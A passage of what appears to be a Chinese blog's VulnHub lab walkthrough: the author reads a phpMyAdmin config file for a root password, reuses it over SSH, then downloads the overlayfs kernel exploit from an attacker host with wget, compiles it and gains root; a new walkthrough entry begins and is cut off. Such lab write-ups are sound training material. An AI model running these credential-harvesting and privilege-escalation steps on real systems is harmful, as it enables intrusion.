class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>add.php  head.php   images  index.php  phpmy     test.php<br>c.php    head2.php  in.php  panel.php  show.php  uploaded_images<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> phpmy<br><span class="hljs-built_in">cd</span> phpmy<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>CREDITS                   js                      server_status.php<br>ChangeLog                 libraries               server_synchronize.php<br>Documentation.html        license.php             server_variables.php<br>Documentation.txt         locale                  setup<br>INSTALL                   main.php                show_config_errors.php<br>LICENSE                   navigation.php          sql.php<br>README                    phpdoctor.ini           tbl_addfield.php<br>README.VENDOR             phpinfo.php             tbl_alter.php<br>RELEASE<span class="hljs-literal">-DATE-3</span>.<span class="hljs-number">4.7</span>        phpmyadmin.css.php      tbl_change.php<br>TODO                      pmd                     tbl_chart.php<br>browse_foreigners.php     pmd_common.php          tbl_create.php<br>bs_disp_as_mime_type.php  pmd_display_field.php   tbl_export.php<br>bs_play_media.php         pmd_general.php         tbl_get_field.php<br>changelog.php             pmd_help.php            tbl_import.php<br>chk_rel.php               pmd_pdf.php             tbl_indexes.php<br>config.inc.php            pmd_relation_new.php    tbl_move_copy.php<br>config.sample.inc.php     pmd_relation_upd.php    tbl_operations.php<br>contrib                   pmd_save_pos.php        tbl_printview.php<br>db_create.php             prefs_forms.php         tbl_relation.php<br>db_datadict.php           prefs_manage.php        tbl_replace.php<br>db_export.php             print.css               tbl_row_action.php<br>db_import.php             querywindow.php         tbl_select.php<br>db_operations.php         robots.txt              tbl_sql.php<br>db_printview.php          schema_edit.php         tbl_structure.php<br>db_qbe.php                schema_export.php       tbl_tracking.php<br>db_search.php             scripts                 themes<br>db_sql.php                server_binlog.php       themes.php<br>db_structure.php          server_collations.php   transformation_overview.php<br>db_tracking.php           server_databases.php    transformation_wrapper.php<br>docs.css                  server_engines.php      url.php<br>enum_editor.php           server_export.php       user_password.php<br>export.php                server_import.php       view_create.php<br>favicon.ico               server_privileges.php   view_operations.php<br>import.php                server_processlist.php  webapp.php<br>import_status.php         server_replication.php<br>index.php                 server_sql.php<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> config.inc.php<br><span class="hljs-built_in">cat</span> config.inc.php<br>&lt;?php<br><br>/* Servers configuration */<br><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br><br>/* Server: localhost [<span class="hljs-number">1</span>] */<br><span class="hljs-variable">$i</span>++;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;verbose&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;host&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;port&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;socket&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;connect_type&#x27;</span>] = <span class="hljs-string">&#x27;tcp&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;extension&#x27;</span>] = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;auth_type&#x27;</span>] = <span class="hljs-string">&#x27;cookie&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;roottoor&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;AllowNoPassword&#x27;</span>] = true;<br><br>/* <span class="hljs-keyword">End</span> of servers configuration */<br><br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;DefaultLang&#x27;</span>] = <span class="hljs-string">&#x27;en-utf-8&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;ServerDefault&#x27;</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;UploadDir&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;SaveDir&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><br>/* rajk - <span class="hljs-keyword">for</span> blobstreaming */<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_garbage_threshold&#x27;</span>] = <span class="hljs-number">50</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_repository_threshold&#x27;</span>] = <span class="hljs-string">&#x27;32M&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_temp_blob_timeout&#x27;</span>] = <span class="hljs-number">600</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_temp_log_threshold&#x27;</span>] = <span class="hljs-string">&#x27;32M&#x27;</span>;<br><br><br>?&gt;<br></code></pre></td></tr></table></figure><p>得到了数据库的用户名和密码，这时候我们要有一定的敏感度，拿到一个用户名和密码都要考虑用户名和密码重用的可能性，这里 ssh 登录发现直接成功了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> ssh root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>     <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.161 (10.10.10.161)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:UyLCTuDmpoRJdivxmtTOMWDk0apVt5NWjp8Xno1e+Z4.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">root@10.10.10.161&#x27;</span>s password: <br>Welcome to Ubuntu <span class="hljs-number">12.04</span>.<span class="hljs-number">5</span> LTS (GNU/Linux <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span><span class="hljs-literal">-32-generic</span> i686)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>  System information as of Wed May <span class="hljs-number">24</span> <span class="hljs-number">16</span>:<span class="hljs-number">41</span>:<span class="hljs-number">21</span> IST <span class="hljs-number">2023</span><br><br>  System load:  <span class="hljs-number">0.0</span>               Processes:           <span class="hljs-number">113</span><br>  Usage of /:   <span class="hljs-number">13.7</span>% of <span class="hljs-number">9.61</span>GB   Users logged <span class="hljs-keyword">in</span>:     <span class="hljs-number">0</span><br>  Memory usage: <span class="hljs-number">22</span>%               IP address <span class="hljs-keyword">for</span> eth0: <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br>  Swap usage:   <span class="hljs-number">0</span>%<br><br>  Graph this <span class="hljs-keyword">data</span> and manage this system at:<br>    https://landscape.canonical.com/<br><br>New release <span class="hljs-string">&#x27;14.04.5 LTS&#x27;</span> available.<br>Run <span class="hljs-string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.<br><br><br>Your Hardware Enablement Stack (HWE) is supported <span class="hljs-keyword">until</span> April <span class="hljs-number">2017</span>.<br><br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>root@indipowershell:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>再考虑别的提权方式，内核比较老，考虑内核提权，搜索内核版本对应的exp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> searchsploit kernel <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>                                              <br><span class="hljs-literal">-------------------------------------------------------------------------------------------------------</span> <span class="hljs-literal">---------------------------------</span><br> Exploit Title                                                                                         |  Path<br><span class="hljs-literal">-------------------------------------------------------------------------------------------------------</span> <span class="hljs-literal">---------------------------------</span><br>Android Kernel &lt; <span class="hljs-number">4.8</span> - ptrace seccomp <span class="hljs-keyword">Filter</span> Bypass                                                    | android/dos/<span class="hljs-number">46434</span>.c<br>Apple iOS &lt; <span class="hljs-number">10.3</span>.<span class="hljs-number">1</span> - Kernel                                                                            | ios/local/<span class="hljs-number">42555</span>.txt<br>Apple Mac OSX &lt; <span class="hljs-number">10.6</span>.<span class="hljs-number">7</span> - Kernel Panic (Denial of Service)                                              | osx/dos/<span class="hljs-number">17901</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> - <span class="hljs-string">&#x27;_kernelrpc_mach_port_insert_right_trap&#x27;</span> Kernel Reference Count L | macos/local/<span class="hljs-number">40956</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> - Broken Kernel Mach Port Name uref Handling Privileged Port Name <span class="hljs-built_in">R</span> | macos/local/<span class="hljs-number">40957</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> Kernel - ipc_port_t Reference Count Leak Due to Incorrect externalM | multiple/dos/<span class="hljs-number">40955</span>.txt<br>DESlock+ &lt; <span class="hljs-number">4.1</span>.<span class="hljs-number">10</span> - <span class="hljs-string">&#x27;vdlptokn.sys&#x27;</span> Local Kernel Ring0 SYSTEM                                           | windows/local/<span class="hljs-number">16138</span>.c<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel <span class="hljs-built_in">Out-of</span><span class="hljs-literal">-Bounds</span> <span class="hljs-built_in">Write</span> Privilege Escalation                | windows/local/<span class="hljs-number">42625</span>.py<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel Pool Overflow / Local Privilege Escalation (<span class="hljs-number">1</span>)          | windows/local/<span class="hljs-number">42624</span>.py<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel Pool Overflow / Local Privilege Escalation (<span class="hljs-number">2</span>)          | windows/local/<span class="hljs-number">42665</span>.py<br>Linux Kernel (Solaris <span class="hljs-number">10</span> / &lt; <span class="hljs-number">5.10</span> <span class="hljs-number">138888</span><span class="hljs-literal">-01</span>) - Local Privilege Escalation                              | solaris/local/<span class="hljs-number">15962</span>.c<br>Linux Kernel <span class="hljs-number">2.6</span>.<span class="hljs-number">19</span> &lt; <span class="hljs-number">5.9</span> - <span class="hljs-string">&#x27;Netfilter Local Privilege Escalation                                      | linux/local/50135.c</span><br><span class="hljs-string">Linux Kernel 3.11 &lt; 4.8 0 - &#x27;</span>SO_SNDBUFFORCE<span class="hljs-string">&#x27; / &#x27;</span>SO_RCVBUFFORCE<span class="hljs-string">&#x27; Local Privilege Escalation             | linux/local/41995.c</span><br><span class="hljs-string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation   | linux/local/37292.c</span><br><span class="hljs-string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation ( | linux/local/37293.txt</span><br><span class="hljs-string">Linux Kernel 3.14-rc1 &lt; 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation         | linux_x86-64/local/33516.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &#x27;</span>CONFIG_X86_X32=y<span class="hljs-string">&#x27; Local Privilege Escalation (3) | linux_x86-64/local/31347.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.10) - &#x27;</span>CONFIG_X86_X32<span class="hljs-string">&#x27; Arbitrary Write (2)                        | linux/local/31346.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 - recvmmsg x32 compat (PoC)                                                  | linux/dos/31305.c</span><br><span class="hljs-string">Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                   | linux/dos/43234.c</span><br><span class="hljs-string">Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation                                             | linux/local/41886.c</span><br><span class="hljs-string">Linux Kernel &lt; 3.16.1 - &#x27;</span>Remount FUSE<span class="hljs-string">&#x27; Local Privilege Escalation                                      | linux/local/34923.c</span><br><span class="hljs-string">Linux Kernel &lt; 3.16.39 (Debian 8 x64) - &#x27;</span>inotfiy<span class="hljs-string">&#x27; Local Privilege Escalation                           | linux_x86-64/local/44302.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.10.13 - &#x27;</span>keyctl_set_reqkey_keyring<span class="hljs-string">&#x27; Local Denial of Service                           | linux/dos/42136.c</span><br><span class="hljs-string">Linux kernel &lt; 4.10.15 - Race Condition Privilege Escalation                                           | linux/local/43345.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.11.8 - &#x27;</span>mq_notify: double sock_put()<span class="hljs-string">&#x27; Local Privilege Escalation                      | linux/local/45553.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.13.1 - BlueTooth Buffer Overflow (PoC)                                                | linux/dos/42762.txt</span><br><span class="hljs-string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                          | linux/local/45010.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.14.rc3 - Local Denial of Service                                                      | linux/dos/42932.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.15.4 - &#x27;</span>show_floppy<span class="hljs-string">&#x27; KASLR Address Leak                                               | linux/local/44325.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.16.11 - &#x27;</span>ext4_read_inline_data()<span class="hljs-string">&#x27; Memory Corruption                                   | linux/dos/44832.txt</span><br><span class="hljs-string">Linux Kernel &lt; 4.17-rc1 - &#x27;</span>AF_LLC<span class="hljs-string">&#x27; Double Free                                                         | linux/dos/44579.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                 | linux/local/44298.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#x27;</span>netfilter target_offset<span class="hljs-string">&#x27; Local Privilege Escalation      | linux_x86-64/local/44300.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)  | linux/local/43418.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escala | linux/local/47169.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.5.1 - Off-By-One (PoC)                                                                | linux/dos/44301.c</span><br><span class="hljs-string">macOS &lt; 10.14.3 / iOS &lt; 12.1.3 - Kernel Heap Overflow in PF_KEY due to Lack of Bounds Checking when Re | multiple/dos/46300.c</span><br><span class="hljs-string">Sony Playstation 4 (PS4) &lt; 7.02 / FreeBSD 9 / FreeBSD 12 - &#x27;</span>ip6_setpktopt<span class="hljs-string">&#x27; Kernel Local Privilege Esca | hardware/local/48644.c</span><br><span class="hljs-string">------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="hljs-string">powershellcodes: No Results</span><br><span class="hljs-string">                                                                                                                                         </span><br><span class="hljs-string">┌──(kali㉿kali)-[~]</span><br><span class="hljs-string">└─$ searchsploit -m 37292     </span><br><span class="hljs-string">  Exploit: Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation</span><br><span class="hljs-string">      URL: https://www.exploit-db.com/exploits/37292</span><br><span class="hljs-string">     Path: /usr/share/exploitdb/exploits/linux/local/37292.c</span><br><span class="hljs-string">File Type: C source, ASCII text, with very long lines (466)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>尝试使用overlayfs</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br><span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br><span class="hljs-literal">--2023-05-24</span> <span class="hljs-number">17</span>:<span class="hljs-number">16</span>:<span class="hljs-number">57</span><span class="hljs-literal">--</span>  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br>Connecting to <span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>... connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: <span class="hljs-number">4968</span> (<span class="hljs-number">4.9</span>K) [<span class="hljs-type">text</span>/<span class="hljs-type">x</span>-<span class="hljs-type">csrc</span>]<br>Saving to: `37292.c<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">100%[======================================&gt;] 4,968       --.-K/s   in 0s      </span><br><span class="hljs-string"></span><br><span class="hljs-string">2023-05-24 17:16:57 (166 MB/s) - `37292.c&#x27;</span> saved [<span class="hljs-number">4968</span>/<span class="hljs-number">4968</span>]<br><br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-number">37292</span>.c<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> gcc <span class="hljs-number">37292</span>.c <span class="hljs-literal">-o</span> overlayfs <br>gcc <span class="hljs-number">37292</span>.c <span class="hljs-literal">-o</span> overlayfs<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> ./overlayfs<br>./overlayfs<br>spawning threads<br><span class="hljs-built_in">mount</span> <span class="hljs-comment">#1</span><br><span class="hljs-built_in">mount</span> <span class="hljs-comment">#2</span><br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br><span class="hljs-comment"># whoami</span><br>whoami<br>root<br><span class="hljs-comment"># id</span><br>id<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root),<span class="hljs-number">33</span>(www<span class="hljs-literal">-data</span>)<br><span class="hljs-comment"># ip a</span><br>ip a<br><span class="hljs-number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="hljs-number">65536</span> qdisc noqueue state UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    inet <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc pfifo_fast state UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:a9:a2:<span class="hljs-number">24</span> brd ff:ff:ff:ff:ff:ff<br>    inet <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.10</span>.<span class="hljs-number">10.255</span> scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::<span class="hljs-number">20</span>c:<span class="hljs-number">29</span>ff:fea9:a224/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>成功提权</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WestWild 1.1 靶机</title>
    <link href="/2023/05/413cb738f5c5.html"/>
    <url>/2023/05/413cb738f5c5.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>一台简洁、标准而不失趣味的靶机。samba 信息泄露获得立足点，权限枚举获得敏感信息，实现横向移动，sudo 枚举获得 root 的权限。</p></blockquote><h1 id="WestWild-1-1"><a href="#WestWild-1-1" class="headerlink" title="WestWild 1.1"></a>WestWild 1.1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 